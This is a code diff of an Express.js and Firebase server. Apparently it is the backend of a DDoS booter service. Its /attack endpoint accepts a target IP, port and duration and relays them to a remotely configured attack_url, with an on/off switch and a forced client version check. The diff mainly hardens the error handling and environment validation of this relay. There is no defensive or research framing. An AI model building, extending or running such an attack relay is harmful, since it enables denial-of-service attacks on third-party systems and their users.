@@ -6,44 +6,71 @@ const admin = require('firebase-admin')
 const app = express()
 app.use(express.json())
 
-// ===== FIREBASE INIT (ENV JSON) =====
-let serviceAccount
-try {
-    serviceAccount = JSON.parse(process.env.FIREBASE_KEY)
-    // fix newline in private key
-    serviceAccount.private_key = serviceAccount.private_key.replace(/\\n/g, '\n')
-} catch (e) {
-    console.error("FIREBASE_KEY parse error:", e.message)
+// ===== ENV VALIDATION =====
+if (!process.env.FIREBASE_DB_URL) {
+    console.error("❌ FIREBASE_DB_URL missing")
     process.exit(1)
 }
 
-admin.initializeApp({
-    credential: admin.credential.cert(serviceAccount),
-    databaseURL: process.env.FIREBASE_DB_URL
-})
+if (!process.env.FIREBASE_KEY) {
+    console.error("❌ FIREBASE_KEY missing")
+    process.exit(1)
+}
+
+// ===== FIREBASE INIT =====
+let serviceAccount
+
+try {
+    serviceAccount = JSON.parse(process.env.FIREBASE_KEY)
+
+    if (!serviceAccount.private_key) {
+        throw new Error("private_key missing in FIREBASE_KEY")
+    }
+
+    // fix newline
+    serviceAccount.private_key =
+        serviceAccount.private_key.replace(/\\n/g, '\n')
+
+} catch (e) {
+    console.error("❌ FIREBASE_KEY parse error:", e.message)
+    process.exit(1)
+}
+
+try {
+    admin.initializeApp({
+        credential: admin.credential.cert(serviceAccount),
+        databaseURL: process.env.FIREBASE_DB_URL
+    })
+} catch (e) {
+    console.error("❌ Firebase init error:", e.message)
+    process.exit(1)
+}
 
 const db = admin.database()
 
-// ===== SIMPLE IN-MEMORY CACHE =====
+// ===== CACHE =====
 let cachedConfig = null
 let lastFetch = 0
-const CACHE_TTL = 5000 // 5s
+const CACHE_TTL = 5000
 
 async function getConfig() {
     const now = Date.now()
+
     if (cachedConfig && (now - lastFetch) < CACHE_TTL) {
         return cachedConfig
     }
 
     const snap = await db.ref('config').get()
+
     if (!snap.exists()) return null
 
     cachedConfig = snap.val()
     lastFetch = now
+
     return cachedConfig
 }
 
-// ===== CONFIG ENDPOINT =====
+// ===== CONFIG =====
 app.get('/config', async (req, res) => {
     try {
         const config = await getConfig()
@@ -58,15 +85,16 @@ app.get('/config', async (req, res) => {
 
         res.json({
             attack_url: config.attack_url,
-            version: config.version
+            version: config.version || 1
         })
 
     } catch (err) {
-        res.status(500).json({ error: err.message })
+        console.error("CONFIG ERROR:", err)
+        res.status(500).json({ error: "Internal error" })
     }
 })
 
-// ===== ATTACK PROXY =====
+// ===== ATTACK =====
 app.post('/attack', async (req, res) => {
     const { ip, port, time } = req.body
 
@@ -81,7 +109,7 @@ app.post('/attack', async (req, res) => {
             return res.status(403).json({ error: "Service OFF" })
         }
 
-        // optional version check (client send header: version)
+        // version check
         const clientVersion = Number(req.headers['version'] || 0)
         if (config.version && clientVersion < config.version) {
             return res.status(426).json({ error: "Update required" })
@@ -89,9 +117,7 @@ app.post('/attack', async (req, res) => {
 
         const response = await fetch(`${config.attack_url}/attack`, {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ ip, port, time })
         })
 
@@ -100,7 +126,8 @@ app.post('/attack', async (req, res) => {
         res.status(response.status).send(data)
 
     } catch (err) {
-        res.status(500).json({ error: err.message })
+        console.error("ATTACK ERROR:", err)
+        res.status(500).json({ error: "Internal error" })
     }
 })
 
@@ -111,5 +138,5 @@ app.get('/', (req, res) => {
 
 const PORT = process.env.PORT || 3000
 app.listen(PORT, () => {
-    console.log("Server running on port", PORT)
+    console.log("🚀 Server running on port", PORT)
 })
